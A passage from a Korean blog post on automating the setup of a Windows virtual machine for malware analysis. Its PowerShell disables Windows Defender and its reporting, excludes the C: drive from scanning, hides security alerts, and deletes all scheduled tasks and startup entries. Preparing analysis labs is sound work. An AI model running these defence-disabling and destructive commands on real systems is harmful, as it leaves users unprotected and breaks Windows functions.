Defender&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableAntiSpyware&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableRoutinelyTakingAction&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Spynet&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SpyNetReporting&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SubmitSamplesConsent&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;MRT&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\MRT&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DontReportInfectionInformation&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">-Not</span> ((<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Class</span> Win32_OperatingSystem).Version <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;6.1.7601&quot;</span>))    {        <span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionPath</span> <span class="hljs-string">&quot;C:\&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableArchiveScanning</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBehaviorMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBlockAtFirstSeen</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupQuickScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIntrusionPreventionSystem</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIOAVProtection</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRemovableDriveScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRestorePoint</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningMappedNetworkDrivesForFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningNetworkFiles</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScriptScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableControlledFolderAccess</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableNetworkProtection</span> AuditMode <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-MAPSReporting</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-SubmitSamplesConsent</span> NeverSend <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-PUAProtection</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        }}</code></pre><p>WinDefend Service&#xC758; &#xACBD;&#xC6B0; &#xC5D0;&#xB7EC;&#xAC00; &#xB728;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC544; try-catch &#xCC98;&#xB9AC;&#xB97C; &#xD558;&#xC600;&#xACE0;, &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xC5D0; &#xB9AC;&#xD3EC;&#xD2B8;&#xB97C; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;, &#xADF8;&#xB9AC;&#xACE0; OS &#xBC84;&#xC804;&#xC774; 6.1.7601 (Windows 7 Service Pack 1)&#xC774; &#xC544;&#xB2D0; &#xACBD;&#xC6B0; (Windows 10&#xC77C; &#xACBD;&#xC6B0;&#xC778; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.) Defender&#xC5D0; &#xCD94;&#xAC00;&#xB41C; &#xB2E4;&#xB978; &#xC124;&#xC815;&#xB4E4;&#xC744; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xC77D;&#xC73C;&#xBA74;&#xC11C; &#xB290;&#xB080; &#xAC74; Windows 7 Service Pack 1&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C; Windows 10&#xACFC; Server 2019&#xC5D0; &#xB300;&#xD55C; Defender &#xBA85;&#xB839;&#xC5B4;&#xC778; &#xAC83; &#xAC19;&#xC740;&#xB370; <code>[System.Envrionment]::OSVersion.Version.Major -eq 10</code>&#xC73C;&#xB85C; Windows 10&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xBA74; &#xB418;&#xC9C0; &#xC54A;&#xB098;? &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC2E4;&#xC0C1; &#xC800;&#xB294; Windows 10 &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD588;&#xC9C0;&#xB9CC;&#xC694;.</p><h1 id="&#xBCF4;&#xC548;-&#xC720;&#xC9C0;-&#xC815;&#xCC45;-&#xC54C;&#xB9BC;-&#xBE44;&#xD65C;&#xC131;&#xD654;"><a href="#&#xBCF4;&#xC548;-&#xC720;&#xC9C0;-&#xC815;&#xCC45;-&#xC54C;&#xB9BC;-&#xBE44;&#xD65C;&#xC131;&#xD654;" class="headerlink" title="&#xBCF4;&#xC548; &#xC720;&#xC9C0; &#xC815;&#xCC45; &#xC54C;&#xB9BC; &#xBE44;&#xD65C;&#xC131;&#xD654;"></a>&#xBCF4;&#xC548; &#xC720;&#xC9C0; &#xC815;&#xCC45; &#xC54C;&#xB9BC; &#xBE44;&#xD65C;&#xC131;&#xD654;</h1><p>&#xBCF4;&#xC548; &#xC720;&#xC9C0; &#xC815;&#xCC45; &#xC54C;&#xB9BC; &#xC544;&#xC774;&#xCF58; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xAC74; &#xAD73;&#xC774; &#xD544;&#xC694; &#xC5C6;&#xC5B4; &#xBCF4;&#xC774;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xC800;&#xB294; &#xBE68;&#xAC04; &#xBD88;&#xC774; &#xB5A0;&#xC788;&#xB2E4;&#xAC70;&#xB098; &#xB290;&#xB08C;&#xD45C;&#xAC00; &#xB5A0;&#xC788;&#xB2E4;&#xAC70;&#xB098; &#xD558;&#xBA74; &#xC2E0;&#xACBD;&#xC774; &#xAD49;&#xC7A5;&#xD788; &#xB9CE;&#xC774; &#xC4F0;&#xC774;&#xB294; &#xC0AC;&#xB78C;&#xC774;&#xAE30;&#xC5D0;&#x2026;</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%201.png" alt></p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;HideSCAHealth&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p>&#xCC3E;&#xC544;&#xBCF4;&#xC558;&#xB354;&#xB2C8; Microsoft Policies&#xC5D0; <a href="https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">HideSCAHealth &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;</a>&#xC5D0; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC624;&#xC608; &#xBC14;&#xB85C; &#xC124;&#xC815;&#xD558;&#xC8E0;! <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer</code>&#xC5D0; <code>HideSCAHealth</code>&#xC758; &#xAC12;&#xC744; 1&#xB85C; &#xD558;&#xBA74; &#xD574;&#xB2F9; &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xBCF4;&#xC548; &#xC54C;&#xB9BC; &#xC124;&#xC815;&#xC774; &#xC228;&#xACA8;&#xC9D1;&#xB2C8;&#xB2E4;!</p><h1 id="&#xC791;&#xC5C5;-&#xC2A4;&#xCF00;&#xC904;&#xB7EC;-&#xC0AD;&#xC81C;"><a href="#&#xC791;&#xC5C5;-&#xC2A4;&#xCF00;&#xC904;&#xB7EC;-&#xC0AD;&#xC81C;" class="headerlink" title="&#xC791;&#xC5C5; &#xC2A4;&#xCF00;&#xC904;&#xB7EC; &#xC0AD;&#xC81C;"></a>&#xC791;&#xC5C5; &#xC2A4;&#xCF00;&#xC904;&#xB7EC; &#xC0AD;&#xC81C;</h1><p>&#xC774;&#xC81C; Windows&#xC5D0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xAC70;&#xB098;, &#xB2E4;&#xB978; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xBA74;&#xC11C; &#xB4F1;&#xB85D;&#xB41C; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xC791;&#xC5C5; &#xC2A4;&#xCF00;&#xC904;&#xB7EC;&#xB97C; &#xC0AD;&#xC81C;&#xD560; &#xC2DC;&#xAC04;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%202.png" alt></p><p>&#xC791;&#xC5C5; &#xC2A4;&#xCF00;&#xC904;&#xB7EC;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C; &#xC774; &#xB140;&#xC11D;&#xB4E4;&#xC744; &#xC0AD;&#xC81C;&#xB97C; &#xD558;&#xB294; &#xAC70;&#xC8E0;. &#xC774; &#xC791;&#xC5C5;&#xC5D4; &#xBE44;&#xD558;&#xC778;&#xB4DC; &#xC5D0;&#xD53C;&#xC18C;&#xB4DC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Task &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xBAA8;&#xB450; &#xC0AD;&#xC81C;&#xB97C; &#xD574;&#xBC84;&#xB9AC;&#xBA74; &#xB420; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD588;&#xC5B4;&#xC694;. &#xC800; &#xBD80;&#xBD84;&#xC5D0; &#xC788;&#xB294; &#xCE5C;&#xAD6C;&#xB4E4;&#xB9CC; &#xAC00;&#xC838;&#xC628;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD558;&#xB294;&#xB370;&#x2026; Windows &#xAE30;&#xB2A5;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB3D9;&#xC791; &#xC548; &#xD558;&#xB294; &#xAC8C; &#xC788;&#xB294; &#xAC70;&#xC5D0;&#xC694;&#x2026; &#xAC80;&#xC0C9;&#xC774; &#xC548; &#xB418;&#xACE0;&#x2026; &#xC65C; &#xC774;&#xB7EC;&#xC9C0;? &#xC65C; &#xC774;&#xB7EC;&#xC9C0;? &#xC5B4;&#xB514;&#xAC00; &#xBB38;&#xC81C;&#xC9C0;? &#xD558;&#xBA74;&#xC11C; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD558;&#xB098;&#xD558;&#xB098; &#xC8FC;&#xC11D; &#xCC98;&#xB9AC;&#xD558;&#xB2E4;&#xAC00; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove_task</span><span class="hljs-params">()</span></span>{    <span class="hljs-variable">$TS</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> Schedule.Service    <span class="hljs-variable">$TS</span>.Connect(<span class="hljs-variable">$env:COMPUTERNAME</span>)    <span class="hljs-variable">$TaskFolder</span> = <span class="hljs-variable">$TS</span>.GetFolder(<span class="hljs-string">&apos;\&apos;</span>)    <span class="hljs-variable">$Tasks</span> = <span class="hljs-variable">$TaskFolder</span>.GetTasks(<span class="hljs-number">1</span>)    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Task</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Tasks</span>)    {        <span class="hljs-variable">$TaskFolder</span>.DeleteTask(<span class="hljs-variable">$Task</span>.Name, <span class="hljs-number">0</span>)    }}</code></pre><p>remove task&#xB294; ComObject&#xB97C; &#xD1B5;&#xD574; Schedule.Service&#xC5D0;&#xC11C; Task &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xC0AD;&#xC81C;&#xB97C; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C; &#xC2A4;&#xCF00;&#xC904;&#xAE4C;&#xC9C0; &#xBAA8;&#xB450; &#xC0AD;&#xC81C;&#xD574;&#xBC84;&#xB824;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xD574;&#xD504;&#xB2DD;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#x315C;.&#x315C;</p><h1 id="&#xC2DC;&#xC791;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-&#xC0AD;&#xC81C;"><a href="#&#xC2DC;&#xC791;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;-&#xC0AD;&#xC81C;" class="headerlink" title="&#xC2DC;&#xC791; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC0AD;&#xC81C;"></a>&#xC2DC;&#xC791; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC0AD;&#xC81C;</h1><p>&#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0;, &#xC5B4;&#xB5A4; &#xAC83;&#xB4E4;&#xC774; autorun &#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xB54C; &#xC5EC;&#xB7EC; &#xC7A1;&#xB2E4;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xBCF4;&#xAE30; &#xD798;&#xB4E4;&#xACA0;&#xC8E0;? &#xADF8;&#xB798;&#xC11C; &#xC774;&#xAC83; &#xB610;&#xD55C; &#xC9C0;&#xC6CC;&#xBC84;&#xB9BD;&#xC2DC;&#xB2E4;!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_startup</span><span class="hljs-params">()</span></span>{    <span class="hljs-variable">$user</span> = <span class="hljs-built_in">New-Object</span> System.Security.Principal.NTAccount(<span class="hljs-variable">$env:username</span>)    <span class="hljs-variable">$sid</span> = (<span class="hljs-variable">$user</span>.Translate([<span class="hljs-type">System.Security.Principal.SecurityIdentifier</span>])).Value    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-20\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\<span class="hljs-variable">$sid</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>}</code></pre><p>&#xD2B9;&#xC815; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0; &#xD55C;&#xD574; &#xB4F1;&#xB85D;&#xB41C; &#xC2DC;&#xC791; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xADF8; &#xC0AC;&#xC6A9;&#xC790;&#xC758; SID &#xACBD;&#xB85C;&#xB97C; &#xD1B5;&#xD574; &#xC800;&#xC7A5;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0; &#xB530;&#xB978; SID &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xC0AD;&#xC81C;&#xB97C; &#xD574;&#xC8FC;&#xB294; &#xAC70;&#xC8E0;! &#xC77C;&#xB2E8;&#xC740;&#x2026; &#xC800;&#xB807;&#xAC8C; &#xC9C0;&#xC815;&#xC744; &#xD588;&#xB294;&#xB370; &#xC548; &#xC9C0;&#xC6CC;&#xC9C0;&#xB294; &#xAC83;&#xB4E4;&#xC774; &#xC788;&#xB354;&#xB77C;&#xAD6C;&#xC694;&#x2026;??? &#xC774;&#xC720;&#xB97C;&#x2026; &#xBABB; &#xCC3E;&#xACA0;&#xC5B4;&#xC11C; &#xB0A8;&#xC544;&#xC788;&#xB294; &#xAC70;&#xB294; &#xC190;&#xC73C;&#xB85C; &#xC9C0;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%203.png" alt></p><p>&#xCD5C;&#xC885;&#xBCF8;&#xC744; &#xAC00;&#xC838;&#xC62C; &#xB54C;&#xB294; &#xAF2D; &#xC218;&#xC815;&#xD574;&#xC11C; &#xAC00;&#xC838;&#xC62C;&#xAC8C;&#xC694;! &#xC774;&#xBC88;&#xB9CC; &#xB108;&#xADF8;&#xB7EC;&#xC774; &#xBD10;&#xC8FC;&#xC2DC;&#xBA74;&#x2026;</p><h1 id="&#xC228;&#xAE40;-&#xD30C;&#xC77C;-&#xD45C;&#xC2DC;"><a href="#&#xC228;&#xAE40;-&#xD30C;&#xC77C;-&#xD45C;&#xC2DC;" class="headerlink" title="&#xC228;&#xAE40; &#xD30C;&#xC77C; &#xD45C;&#xC2DC;"></a>&#xC228;&#xAE40; &#xD30C;&#xC77C; &#xD45C;&#xC2DC;</h1><p>&#xC774;&#xC81C; &#xC228;&#xAE40; &#xD30C;&#xC77C;&#xACFC; &#xC2DC;&#xC2A4;&#xD15C; &#xC228;&#xAE40; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xD45C;&#xC2DC;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC228;&#xAE40; &#xD30C;&#xC77C;&#xC744; &#xCCB4;&#xD06C;&#xD558;&#xACE0; &#xD558;&#xB294; &#xAC83; &#xB610;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC791;&#xC5C5;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. Windows&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC774;&#xAC83;&#xC800;&#xAC83; &#xC124;&#xC815;&#xD558;&#xB2C8;&#xAE4C;&#xC694;.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Hidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;ShowSuperHidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p><code>Hidden</code>&#xACFC; <code>ShowSuperHidden</code>&#xC758; &#xAC12;&#xC744; 1&#xB85C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xB05D;&#xC785;&#xB2C8;&#xB2E4;! &#xC774;&#xC81C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC124;&#xC815;&#xC740; &#xC644;&#xB8CC;&#xB418;&#xC5C8;&#xC5B4;&#xC694;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>&#xAC04;&#xB2E8;&#xD55C; Windows &#xC124;&#xC815;&#xC744; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xC791;&#xC131;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC190;&#xC73C;&#xB85C; &#xD574;&#xB3C4; &#xC5BC;&#xB9C8; &#xC548; &#xAC78;&#xB9AC;&#xC9C0;&#xB9CC;, &#xAC00;&#xB054; &#xBA87; &#xAC1C; &#xAE4C;&#xBA39;&#xC744; &#xB54C;&#xB3C4; &#xC788;&#xACE0; &#xADC0;&#xCC2E;&#xC796;&#xC544;&#xC694;? &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xC2E4;&#xD589;&#xB9CC; &#xD558;&#xBA74; &#xC774; &#xBAA8;&#xB4E0; &#xAC83;&#xB4E4;&#xC744; <del>&#xBB34;&#xB8CC;!</del> &#xAE4C;&#xBA39;&#xC740; &#xAC70; &#xC5C6;&#xC774; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; chocolatey&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xD234;&#xB4E4;&#xC744; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xAC1C;&#xC778;&#xC758; &#xC785;&#xB9DB;&#xC5D0; &#xB9DE;&#xAC8C; 